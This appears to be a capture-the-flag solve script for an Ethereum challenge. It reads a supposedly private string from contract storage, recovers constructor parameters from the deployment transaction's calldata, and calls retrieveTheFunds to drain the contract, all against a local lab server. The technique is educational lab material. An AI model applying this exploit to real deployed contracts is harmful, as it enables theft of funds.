const ethers = require('ethers');
const path = require('path');
const fs = require('fs');
const ts = require('typescript');
const fetch = require('node-fetch');

const HOST = "http://localhost:3000";
const ETH_HOST = "http://localhost:8545";

async function main() {
    await solveSecretAndEphemeral();
}

async function getChalDetails() {
    const details = await fetch(`${HOST}/challenge`);
    const data = await details.json();

    const privKey = data.player_wallet.private_key;
    const contractAddr = data.contract_address[0].address;

    return [privKey, contractAddr];
}

async function printFlag() {
    const details = await fetch(`${HOST}/challenge/solve`);
    const data = await details.json();

    const flag = data.flag;
    console.log(flag);
}


async function solveSecretAndEphemeral() {

    const details = await getChalDetails();

    const privKey = details[0];
    const contractAddr = details[1];

    const provider = ethers.getDefaultProvider(`${ETH_HOST}`);
    const wallet = new ethers.Wallet(privKey, provider);

    // Get secret String
    // This isn't strictly required because you can also get this data from the
    // Deployment transaction, but is here for fun anyway :)
    const secretIndexPadded = ethers.utils.hexZeroPad(3, 32);
    const lengthOfStringX2 = await provider.getStorageAt(contractAddr, secretIndexPadded);
    const byteLengthString = (Number(lengthOfStringX2) - 1 )/ 2;
    const numSlots = Math.ceil(byteLengthString / 32);
    
    console.log("Byte Length of String is:", byteLengthString);
    console.log("This will take up", numSlots, "storage slots")

    const outputs = [];
    for (let i = 0; i < numSlots; i++ ) {
        const hashStore = ethers.utils.arrayify(ethers.utils.keccak256(secretIndexPadded));
        hashStore[31] += i;
        outputs.push(await provider.getStorageAt(contractAddr, ethers.utils.hexlify(hashStore)));
    }
    console.log("Secret found:")
    const secret = ethers.utils.toUtf8String(ethers.utils.hexConcat(outputs)).replace(/\0/g, '');
    console.log(secret);
    console.log(secret.length);

    // Find transaction of deployment to get deployment data.
    // Get Deployer address number
    let blockNumber = (await provider.getBlock()).number;
    let tx = null;
    while (tx == null) {
        console.log(blockNumber);
        const blockTxs =  (await provider.getBlock(blockNumber - 1)).transactions;
        if (blockTxs.length > 0) {
            const txs = (await provider.getBlockWithTransactions(blockNumber - 1)).transactions;
            tx = txs.find(tx => tx.to == undefined && tx.creates == contractAddr)
        }
        blockNumber --;
    }
    console.log(blockNumber);

    // This is from inspection, I'm not sure if there is a way you can determine which part of the bytecode
    // are the constructor params without decompiling.

    // Param section is 10 * 32 bytes long.
    const sender_addr = tx.from;
    const const_params = "0x" + tx.data.slice(-320);

    // Using definition in smart constract constructor.
    const params = ethers.utils.defaultAbiCoder.decode(["string", "uint256"], const_params)
    console.log(sender_addr);

    const abi = ["function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address)"];

    const contract = new ethers.Contract(contractAddr, abi, wallet);
    const solvetx = await contract.retrieveTheFunds(params[0], params[1], sender_addr)
    await solvetx.wait();

    await printFlag();

}


main()
.then(() => {
    console.log("bada bing ka zoi");
    process.exit(0);
})
.catch((error) => {
    console.error(error);
    process.exit(1);
});